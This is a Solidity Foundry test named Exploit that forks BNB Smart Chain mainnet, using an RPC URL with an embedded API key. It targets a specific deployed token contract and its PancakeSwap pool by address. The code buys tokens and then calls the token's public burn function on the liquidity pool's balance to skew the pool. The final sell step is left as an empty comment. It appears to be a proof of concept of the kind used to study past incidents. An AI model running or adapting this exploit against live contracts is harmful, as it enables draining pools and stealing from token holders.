// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "forge-std/Test.sol";

import {Awesome} from "src/awesome.sol";

interface IPancakeRouter01 {
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);
}

contract Exploit is Test {
    address lpAddress = 0xCabfCb94FF292421064cdB498652766bBc09ad23;
    address tokenAddress = 0xF7C01B3a51Cc6dCDA425fE24245a2fC2fF40ff19;
    address exploiter = makeAddr("random");
    Awesome awesome = Awesome(payable(tokenAddress));
    IPancakeRouter01 router =
        IPancakeRouter01(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() external {
        vm.createSelectFork(
            "https://bsc-mainnet.nodereal.io/v1/49a90abd283f42b7819006ef39fc0996"
        );
    }

    function testExploit() external {
        vm.startPrank(exploiter);

        // fund wallet
        deal(router.WETH(), exploiter, 100 ether);

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = tokenAddress;

        uint tokenBalanceBefore = IERC20(tokenAddress).balanceOf(address(this));

        IERC20(router.WETH()).approve(address(router), 1 ether);

        // buy tokens
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1 ether,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint tokenBalanceAfter = IERC20(tokenAddress).balanceOf(address(this));

        assertGt(tokenBalanceAfter, tokenBalanceBefore);

        uint lpAddressBalanceBeforeBurn = IERC20(tokenAddress).balanceOf(
            lpAddress
        );

        // burn lp's tokens
        awesome.burn(lpAddress, 178997814);

        uint lpAddressBalanceAfterBurn = IERC20(tokenAddress).balanceOf(
            lpAddress
        );

        console.log(
            "lp change ",
            lpAddressBalanceBeforeBurn,
            lpAddressBalanceAfterBurn
        );

        // sell tokens
    }
}
